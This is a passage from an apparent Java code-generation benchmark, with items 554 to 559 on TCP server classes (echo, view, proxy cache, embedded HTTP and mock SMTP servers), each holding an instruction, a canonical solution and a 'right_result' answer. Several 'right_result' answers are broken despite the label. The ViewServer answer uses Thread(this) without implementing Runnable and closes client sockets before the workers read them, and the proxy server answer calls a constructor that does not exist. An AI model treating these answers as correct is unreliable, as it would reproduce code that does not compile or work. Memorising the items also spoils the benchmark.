serverSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 554,
    "Instruction": "Task Description: Create a Java class that implements a simple TCP echo server using ServerSocket to listen for client connections, receive messages, and send them back to the client with an \"ECHO : \" prefix until the client sends \"bye\" or an empty message.\n\nClass Description: The EchoServer class represents a TCP server that echoes back received messages to connected clients. It handles client connections, message processing, and resource cleanup.\n\nAttributes:\n- server: [ServerSocket] - The server socket listening for incoming connections\n- client: [Socket] - The socket representing the connected client\n- out: [PrintStream] - Output stream to send data to the client\n- buf: [BufferedReader] - Input stream to read data from the client\n- flag: [boolean] - Control flag for the server's main loop\n\nMethods:\n- EchoServer(int port) -> [void] - Constructor that initializes the server socket on the specified port\n- start() -> [void] - Starts the server, accepts client connections, and begins echoing messages\n- close() -> [void] - Closes client and server sockets to release resources",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.PrintStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoServer {\n\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n    private BufferedReader buf;\n    private boolean flag;\n\n    public EchoServer(int port) throws Exception {\n        server = new ServerSocket(port);\n        flag = true;\n    }\n\n    public void start() throws Exception {\n        System.out.println(\"\u670d\u52a1\u5668\u8fd0\u884c\uff0c\u7b49\u5f85\u5ba2\u6237\u7aef\u8fde\u63a5\u3002\");\n        client = server.accept();\n        out = new PrintStream(client.getOutputStream());\n        buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n        while (flag) {\n            String str = buf.readLine();\n            if (str == null || \"\".equals(str)) {\n                flag = false;\n            } else {\n                if (\"bye\".equals(str)) {\n                    flag = false;\n                } else {\n                    out.println(\"ECHO : \" + str);\n                }\n            }\n        }\n    }\n\n    public void close() throws Exception {\n        client.close();\n        server.close();\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class EchoServer {\n    private ServerSocket server;\n    private Socket client;\n    private PrintStream out;\n    private BufferedReader buf;\n    private boolean flag = true;\n\n    public EchoServer(int port) throws IOException {\n        server = new ServerSocket(port);\n    }\n\n    public void start() throws IOException {\n        while (flag) {\n            client = server.accept();\n            out = new PrintStream(client.getOutputStream());\n            buf = new BufferedReader(new InputStreamReader(client.getInputStream()));\n            String inputLine;\n            while ((inputLine = buf.readLine()) != null && !inputLine.equals(\"bye\") && !inputLine.isEmpty()) {\n                out.println(\"ECHO : \" + inputLine);\n            }\n            close();\n        }\n    }\n\n    public void close() {\n        try {\n            if (out != null) out.close();\n            if (buf != null) buf.close();\n            if (client != null) client.close();\n            if (server != null) server.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            EchoServer echoServer = new EchoServer(12345);\n            echoServer.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 555,
    "Instruction": "Task Description: Create a TCP server class that handles multiple types of client requests through socket communication, supporting operations like content updates, progress tracking, and layout management.\n\nClass Description: LinkServer is a TCP server implementation that listens on a specified port for incoming client connections. It handles different types of requests defined by operation codes, manages client connections in separate threads, and provides bidirectional communication through input/output streams.\n\nAttributes:\n- server: ServerSocket - The main server socket that listens for incoming connections\n- port: int - The port number on which the server listens (default: 9999)\n- UPDATE_CONTENT: int - Constant for content update operation (value: 1)\n- UPDATE_PROGRESS: int - Constant for progress update operation (value: 2)\n- GET_CURRENT_CONTENT: int - Constant for content retrieval operation (value: 3)\n- SET_DRAW_DEBUG: int - Constant for debug mode setting operation (value: 4)\n- GET_LAYOUT_LIST: int - Constant for layout list retrieval operation (value: 5)\n- GET_CURRENT_LAYOUT: int - Constant for current layout retrieval operation (value: 6)\n- UPDATE_LAYOUT_DIMENSIONS: int - Constant for layout dimensions update operation (value: 7)\n\nMethods:\n- LinkServer() -> void - Default constructor initializes server with default port\n- LinkServer(int port) -> void - Constructor that takes a custom port number\n- init() -> void - Initializes the ServerSocket instance\n- start() -> void - Starts the server and begins accepting client connections in a dedicated thread\n- handleRequest(Socket socket) -> void - Handles client requests in a separate thread (Input: client socket)\n- closeConnection(Socket socket) -> void - Closes the client socket connection (Input: client socket to close)",
    "Canonical_solution": "import java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Set;\n\npublic class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n\n    final int UPDATE_CONTENT = 1;\n    final int UPDATE_PROGRESS = 2;\n    final int GET_CURRENT_CONTENT = 3;\n    final int SET_DRAW_DEBUG = 4;\n    final int GET_LAYOUT_LIST = 5;\n    final int GET_CURRENT_LAYOUT = 6;\n    final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {\n        init();\n        start();\n    }\n\n    public LinkServer(int port) {\n        this.port = port;\n        init();\n        start();\n    }\n\n    private void init() {\n        try {\n            server = new ServerSocket(port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void start() {\n        Thread t = new Thread(() -> {\n            try {\n                while (true) {\n                    Socket client = server.accept();\n                    Thread acceptThread = new Thread(() -> handleRequest(client));\n                    acceptThread.start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        t.setName(\"Link Debug Thread\");\n        t.start();\n    }\n\n    void handleRequest(Socket socket) {\n        boolean running = true;\n        DataInputStream reader;\n        DataOutputStream writer;\n        try {\n            reader = new DataInputStream(socket.getInputStream());\n            writer = new DataOutputStream(socket.getOutputStream());\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n\n        while (running) {\n            try {\n                int type = reader.readInt();\n                String name = reader.readUTF();\n                switch (type) {\n                    case UPDATE_CONTENT:\n                        String content = reader.readUTF();\n                        break;\n                    case UPDATE_PROGRESS:\n                        float progress = reader.readFloat();\n                        break;\n                    case GET_CURRENT_CONTENT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case SET_DRAW_DEBUG:\n                        boolean drawDebug = reader.readBoolean();\n                        break;\n                    case GET_LAYOUT_LIST:\n                        Set<String> list = Set.of();\n                        writer.writeInt(list.size());\n                        for (String layout : list) {\n                            writer.writeUTF(layout);\n                        }\n                        break;\n                    case GET_CURRENT_LAYOUT:\n                        content = \"\";\n                        writer.writeUTF(content);\n                        break;\n                    case UPDATE_LAYOUT_DIMENSIONS:\n                        int width = reader.readInt();\n                        int height = reader.readInt();\n                        break;\n                }\n            } catch (Exception e) {\n                closeConnection(socket);\n                running = false;\n            }\n        }\n    }\n\n    private void closeConnection(Socket socket) {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class LinkServer {\n    private ServerSocket server;\n    private int port = 9999;\n\n    public static final int UPDATE_CONTENT = 1;\n    public static final int UPDATE_PROGRESS = 2;\n    public static final int GET_CURRENT_CONTENT = 3;\n    public static final int SET_DRAW_DEBUG = 4;\n    public static final int GET_LAYOUT_LIST = 5;\n    public static final int GET_CURRENT_LAYOUT = 6;\n    public static final int UPDATE_LAYOUT_DIMENSIONS = 7;\n\n    public LinkServer() {}\n\n    public LinkServer(int port) {\n        this.port = port;\n    }\n\n    public void init() throws IOException {\n        server = new ServerSocket(port);\n    }\n\n    public void start() {\n        Thread serverThread = new Thread(() -> {\n            try {\n                while (true) {\n                    Socket clientSocket = server.accept();\n                    new Thread(() -> handleRequest(clientSocket)).start();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    public void handleRequest(Socket socket) {\n        try (\n            InputStream inputStream = socket.getInputStream();\n            OutputStream outputStream = socket.getOutputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            PrintWriter writer = new PrintWriter(outputStream, true)\n        ) {\n            String request = reader.readLine();\n            // Process request based on operation code\n            switch (Integer.parseInt(request)) {\n                case UPDATE_CONTENT:\n                    // Handle content update\n                    break;\n                case UPDATE_PROGRESS:\n                    // Handle progress update\n                    break;\n                case GET_CURRENT_CONTENT:\n                    // Send current content\n                    break;\n                case SET_DRAW_DEBUG:\n                    // Set draw debug mode\n                    break;\n                case GET_LAYOUT_LIST:\n                    // Send layout list\n                    break;\n                case GET_CURRENT_LAYOUT:\n                    // Send current layout\n                    break;\n                case UPDATE_LAYOUT_DIMENSIONS:\n                    // Update layout dimensions\n                    break;\n                default:\n                    // Unknown operation\n                    break;\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection(socket);\n        }\n    }\n\n    public void closeConnection(Socket socket) {\n        try {\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 556,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles multiple client connections concurrently using thread pooling. The server should listen on a specified port, accept incoming connections, and process client requests in separate worker threads.\n\nClass Description: ViewServer is a TCP server implementation that manages incoming client connections using a thread pool. It provides methods to start and stop the server, and processes client requests asynchronously through worker threads.\n\nAttributes:\n- VIEW_SERVER_DEFAULT_PORT: int - Default port number for the server (4939)\n- VIEW_SERVER_MAX_CONNECTIONS: int - Maximum number of concurrent connections (10)\n- mServer: ServerSocket - The server socket instance for accepting connections\n- mPort: int - The port number on which the server listens\n- mThread: Thread - The server's main thread\n- mThreadPool: ExecutorService - Thread pool for handling client connections\n\nMethods:\n- ViewServer(int port) -> None - Constructor that initializes the server with specified port\n- start() -> boolean - Starts the server thread and initializes thread pool, returns true if successful\n- stop() -> boolean - Stops the server thread, shuts down thread pool, and closes server socket, returns true if successful\n- run() -> None - Main server loop that accepts incoming connections and delegates to worker threads\n- ViewServerWorker(Socket client) -> None - Nested class constructor for handling individual client connections\n- run() (in ViewServerWorker) -> None - Processes client request by reading input stream and closing connection",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n        return true;\n    }\n\n    public boolean stop() {\n        if (mThread != null) {\n            mThread.interrupt();\n            if (mThreadPool != null) {\n                try {\n                    mThreadPool.shutdownNow();\n                } catch (SecurityException e) {\n                    // Ignore\n                }\n            }\n\n            mThreadPool = null;\n            mThread = null;\n\n            try {\n                mServer.close();\n                mServer = null;\n                return true;\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n        return false;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            // Ignore\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            } catch (Exception e) {\n                // Ignore\n            }\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                String request = in.readLine();\n                // Process client request here\n            } catch(IOException e) {\n                // Ignore\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        // Ignore\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ViewServer {\n    public static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    public static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port) {\n        this.mPort = port;\n        this.mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n    }\n\n    public boolean start() {\n        try {\n            this.mServer = new ServerSocket(mPort);\n            this.mThread = new Thread(this);\n            this.mThread.start();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    public boolean stop() {\n        try {\n            this.mServer.close();\n            this.mThreadPool.shutdown();\n            this.mThread.join();\n            return true;\n        } catch (InterruptedException | IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    @Override\n    public void run() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try (Socket client = mServer.accept()) {\n                mThreadPool.execute(new ViewServerWorker(client));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket client;\n\n        public ViewServerWorker(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            try (\n                InputStream inputStream = client.getInputStream();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))\n            ) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Process client request here\n                    System.out.println(\"Received: \" + line);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    client.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 557,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP proxy cache server using ServerSocket for handling client connections and requests.\n\nClass Description: The HttpProxyCacheServer class acts as a local proxy server that listens for incoming client connections, processes HTTP GET requests, and can respond to ping requests. It manages client connections using a thread pool for concurrent request handling.\n\nAttributes:\n- serverSocket: [ServerSocket] - The main server socket that listens for incoming client connections\n- port: [int] - The port number on which the server is listening\n- waitConnectionThread: [Thread] - Thread that waits for incoming client connections\n- socketProcessor: [ExecutorService] - Thread pool for processing client sockets concurrently\n- pinger: [Pinger] - Helper class for handling ping requests\n\nMethods:\n- HttpProxyCacheServer([Context context]) -> [void] - Constructor that initializes the server socket and starts the connection waiting thread\n- waitForRequest() -> [void] - Continuously accepts incoming client connections and submits them to the thread pool\n- processSocket([Socket socket]) -> [void] - Processes an individual client socket connection and handles the request\n- releaseSocket([Socket socket]) -> [void] - Properly closes and releases socket resources\n- WaitRequestsRunnable([CountDownLatch startSignal]) -> [void] - Runnable implementation that starts the connection waiting process\n- SocketProcessorRunnable([Socket socket]) -> [void] - Runnable implementation that processes an individual client socket",
    "Canonical_solution": "import android.content.Context;\nimport java.io.File;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Locale;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class HttpProxyCacheServer {\n\n    private static final String PROXY_HOST = \"127.0.0.1\";\n\n    private final ServerSocket serverSocket;\n    private final int port;\n    private final Thread waitConnectionThread;\n    private final ExecutorService socketProcessor = Executors.newFixedThreadPool(8);\n    private final Pinger pinger;\n\n    public HttpProxyCacheServer(Context context) {\n        try {\n            InetAddress inetAddress = InetAddress.getByName(PROXY_HOST);\n            this.serverSocket = new ServerSocket(0, 8, inetAddress);\n            this.port = serverSocket.getLocalPort();\n            CountDownLatch startSignal = new CountDownLatch(1);\n            this.waitConnectionThread = new Thread(new WaitRequestsRunnable(startSignal));\n            this.waitConnectionThread.start();\n            startSignal.await();\n            this.pinger = new Pinger(PROXY_HOST, port);\n        } catch (IOException | InterruptedException e) {\n            socketProcessor.shutdown();\n            throw new IllegalStateException(\"Error starting local proxy server\", e);\n        }\n    }\n\n    private void waitForRequest() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private void processSocket(Socket socket) {\n        try {\n            GetRequest request = GetRequest.read(socket.getInputStream());\n            String url = ProxyCacheUtils.decode(request.uri);\n            if (pinger.isPingRequest(url)) {\n                pinger.responseToPing(socket);\n            } else {\n                // Process client request\n            }\n        } catch (SocketException e) {\n            // Client closed connection\n        } catch (IOException e) {\n            // Handle error\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    private void releaseSocket(Socket socket) {\n        try {\n            if (!socket.isInputShutdown()) {\n                socket.shutdownInput();\n            }\n            if (!socket.isOutputShutdown()) {\n                socket.shutdownOutput();\n            }\n            if (!socket.isClosed()) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle error\n        }\n    }\n\n    private final class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable(CountDownLatch startSignal) {\n            this.startSignal = startSignal;\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            waitForRequest();\n        }\n    }\n\n    private final class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            processSocket(socket);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class HttpProxyCacheServer {\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread waitConnectionThread;\n    private ExecutorService socketProcessor;\n    private Pinger pinger;\n\n    public HttpProxyCacheServer(int port) throws IOException {\n        this.port = port;\n        this.serverSocket = new ServerSocket(port);\n        this.socketProcessor = Executors.newFixedThreadPool(10);\n        this.pinger = new Pinger();\n        this.waitConnectionThread = new Thread(new WaitRequestsRunnable());\n        this.waitConnectionThread.start();\n    }\n\n    public void waitForRequest() {\n        try {\n            while (!serverSocket.isClosed()) {\n                Socket socket = serverSocket.accept();\n                socketProcessor.submit(new SocketProcessorRunnable(socket));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void processSocket(Socket socket) {\n        try (\n            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter writer = new PrintWriter(socket.getOutputStream(), true)\n        ) {\n            String line;\n            StringBuilder request = new StringBuilder();\n            while ((line = reader.readLine()) != null && !line.isEmpty()) {\n                request.append(line).append(\"\\r\\n\");\n            }\n            if (request.toString().contains(\"GET\")) {\n                // Handle GET request\n                writer.println(\"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Hello World</body></html>\");\n            } else if (request.toString().contains(\"PING\")) {\n                pinger.handlePing(writer);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            releaseSocket(socket);\n        }\n    }\n\n    public void releaseSocket(Socket socket) {\n        try {\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static class WaitRequestsRunnable implements Runnable {\n        private final CountDownLatch startSignal;\n\n        public WaitRequestsRunnable() {\n            this.startSignal = new CountDownLatch(1);\n        }\n\n        @Override\n        public void run() {\n            startSignal.countDown();\n            try {\n                startSignal.await();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println(\"Waiting for requests...\");\n        }\n    }\n\n    private static class SocketProcessorRunnable implements Runnable {\n        private final Socket socket;\n\n        public SocketProcessorRunnable(Socket socket) {\n            this.socket = socket;\n        }\n\n        @Override\n        public void run() {\n            new HttpProxyCacheServer().processSocket(socket);\n        }\n    }\n\n    private static class Pinger {\n        public void handlePing(PrintWriter writer) {\n            writer.println(\"PONG\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 558,
    "Instruction": "Task Description: Implement a simple embedded HTTP server in Java that can handle incoming HTTP requests, parse request headers, and delegate request handling to a customizable method.\n\nClass Description: The EmbedHttpServer class represents a basic HTTP server that listens on a specified port, accepts client connections, parses HTTP requests, and provides hooks for custom request handling.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- serverSocket: ServerSocket - The server socket used to accept client connections\n\nMethods:\n- EmbedHttpServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> void - Starts the server by creating a ServerSocket and launching a new thread to handle connections\n- stop() -> void - Stops the server by closing the ServerSocket and cleaning up resources\n- handle(String method, String path, HashMap<String, String> headers, InputStream input, OutputStream response) -> void - Abstract method to be implemented for custom request handling (takes HTTP method, path, headers, request body stream, and response stream)\n- run() -> void - Main server loop that accepts connections, parses requests, and delegates to handle() method (implements Runnable interface)\n- BodyInputStream(InputStream ins, int n) -> None - Nested class constructor that creates an input stream with limited bytes to read\n- available() -> int - Returns the number of bytes available in the BodyInputStream\n- read() -> int - Reads a single byte from the BodyInputStream\n- read(byte[] b, int off, int len) -> int - Reads bytes into an array from the BodyInputStream\n- skip(long n) -> long - Throws IOException as skipping is not supported\n- close() -> void - Closes the underlying input stream",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\n\npublic class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws IOException {\n        if (serverSocket == null) {\n            serverSocket = new ServerSocket(port);\n            new Thread(this, \"embed-http-server\").start();\n        }\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n            serverSocket = null;\n        }\n    }\n\n    protected void handle(String method, String path,\n            HashMap<String, String> headers, InputStream input,\n            OutputStream response) throws Exception {\n    }\n\n    @Override\n    public void run() {\n        final ServerSocket ss = serverSocket;\n        while (ss == serverSocket) {\n            Socket conn = null;\n            try {\n                conn = ss.accept();\n                String method = null;\n                String path = null;\n                HashMap<String, String> headers = new HashMap<String, String>();\n\n                InputStream ins = conn.getInputStream();\n                StringBuilder sb = new StringBuilder(512);\n                int l;\n                while ((l = ins.read()) != -1) {\n                    if (l == '\\n') {\n                        if (sb.length() > 0\n                                && sb.charAt(sb.length() - 1) == '\\r')\n                            sb.setLength(sb.length() - 1);\n                        if (sb.length() == 0) {\n                            break;\n                        } else if (method == null) {\n                            int i = sb.indexOf(\" \");\n                            method = sb.substring(0, i);\n                            int j = sb.lastIndexOf(\" HTTP/\");\n                            path = sb.substring(i + 1, j).trim();\n                        } else {\n                            int i = sb.indexOf(\":\");\n                            String name = sb.substring(0, i).trim();\n                            String val = sb.substring(i + 1).trim();\n                            headers.put(name, val);\n                        }\n                        sb.setLength(0);\n                    } else {\n                        sb.append((char) l);\n                    }\n                }\n                int contentLength = 0;\n                String str = headers.get(\"Content-Length\");\n                if (str != null) {\n                    contentLength = Integer.parseInt(str);\n                }\n                OutputStream os = conn.getOutputStream();\n                str = headers.get(\"Expect\");\n                if (\"100-Continue\".equalsIgnoreCase(str)) {\n                    os.write(\"HTTP/1.1 100 Continue\\r\\n\\r\\n\".getBytes(\"ASCII\"));\n                    os.flush();\n                }\n                InputStream input = new BodyInputStream(ins, contentLength);\n                handle(method, path, headers, input, os);\n                os.close();\n\n                conn.close();\n                conn = null;\n            } catch (Exception e) {\n                if (conn != null) {\n                    try {\n                        conn.close();\n                    } catch (Exception ee) {\n                    }\n                }\n            }\n\n            if (!ss.isBound() || ss.isClosed()) {\n                serverSocket = null;\n            }\n        }\n    }\n\n    private static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int n;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.n = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return n;\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (n <= 0)\n                return -1;\n            int r = ins.read();\n            if (r != -1)\n                n--;\n            return r;\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (n <= 0)\n                return -1;\n            int l = ins.read(b, off, len < n ? len : n);\n            if (l != -1)\n                n -= l;\n            return l;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"unsupported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic abstract class EmbedHttpServer implements Runnable {\n    private int port;\n    private ServerSocket serverSocket;\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            Thread serverThread = new Thread(this);\n            serverThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public abstract void handle(String method, String path, Map<String, String> headers, InputStream input, OutputStream response);\n\n    @Override\n    public void run() {\n        while (!Thread.currentThread().isInterrupted()) {\n            try (Socket clientSocket = serverSocket.accept();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                 BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()))) {\n\n                String requestLine = reader.readLine();\n                String[] parts = requestLine.split(\" \");\n                String method = parts[0];\n                String path = parts[1];\n\n                Map<String, String> headers = new HashMap<>();\n                String headerLine;\n                while ((headerLine = reader.readLine()) != null && !headerLine.isEmpty()) {\n                    String[] headerParts = headerLine.split(\": \");\n                    headers.put(headerParts[0], headerParts[1]);\n                }\n\n                long contentLength = Long.parseLong(headers.getOrDefault(\"Content-Length\", \"0\"));\n                BodyInputStream bodyInput = new BodyInputStream(clientSocket.getInputStream(), (int) contentLength);\n\n                handle(method, path, headers, bodyInput, clientSocket.getOutputStream());\n\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    static class BodyInputStream extends InputStream {\n        private InputStream ins;\n        private int n;\n\n        public BodyInputStream(InputStream ins, int n) {\n            this.ins = ins;\n            this.n = n;\n        }\n\n        @Override\n        public int available() throws IOException {\n            return n > 0 ? n : ins.available();\n        }\n\n        @Override\n        public int read() throws IOException {\n            if (n <= 0) {\n                return -1;\n            }\n            n--;\n            return ins.read();\n        }\n\n        @Override\n        public int read(byte[] b, int off, int len) throws IOException {\n            if (n <= 0) {\n                return -1;\n            }\n            len = Math.min(len, n);\n            int bytesRead = ins.read(b, off, len);\n            if (bytesRead > 0) {\n                n -= bytesRead;\n            }\n            return bytesRead;\n        }\n\n        @Override\n        public long skip(long n) throws IOException {\n            throw new IOException(\"Skipping is not supported\");\n        }\n\n        @Override\n        public void close() throws IOException {\n            ins.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 559,
    "Instruction": "Task Description: Create a mock SMTP server implementation in Java that can simulate SMTP interactions, handle TLS upgrades, and manage client connections for testing purposes.\n\nClass Description: MockSmtpServer is a test utility class that simulates an SMTP server with support for plaintext and TLS connections. It maintains a queue of expected interactions and processes them sequentially when clients connect.\n\nAttributes:\n- interactions: Deque<SmtpInteraction> - A thread-safe queue of expected SMTP interactions (commands, responses, TLS upgrades)\n- waitForConnectionClosed: CountDownLatch - Synchronization aid to wait for client disconnection\n- waitForAllExpectedCommands: CountDownLatch - Synchronization aid to wait for all expected commands to be processed\n- keyStoreProvider: KeyStoreProvider - Provides SSL/TLS keystore information\n- logger: Logger - Logging interface for server activities\n- mockServerThread: MockServerThread - The server thread handling client connections\n- host: String - The server's host address\n- port: int - The server's listening port\n\nMethods:\n- start() -> void - Starts the server on a random available port and begins listening for connections\n- shutdown() -> void - Stops the server and closes all connections\n- MockServerThread(ServerSocket, Deque<SmtpInteraction>, CountDownLatch, CountDownLatch, Logger, KeyStoreProvider) -> void - Inner class constructor for the server thread\n- run() -> void - Main server thread execution handling client connections and SMTP protocol\n- readExpectedCommand(ExpectedCommand) -> void - Reads and verifies an expected command from the client\n- writeCannedResponse(CannedResponse) -> void - Writes a predefined response to the client\n- upgradeToTls(Socket) -> void - Upgrades the connection to TLS using the provided keystore\n- shouldStop() -> void - Signals the server thread to stop processing\n\nNested Classes/Interfaces:\n- SmtpInteraction: Interface - Marker interface for SMTP interaction types\n- ExpectedCommand: Class - Represents an expected SMTP command from the client\n- CannedResponse: Class - Represents a predefined server response\n- UpgradeToTls: Class - Marker for TLS upgrade interaction\n- Logger: Interface - Logging interface for server activities",
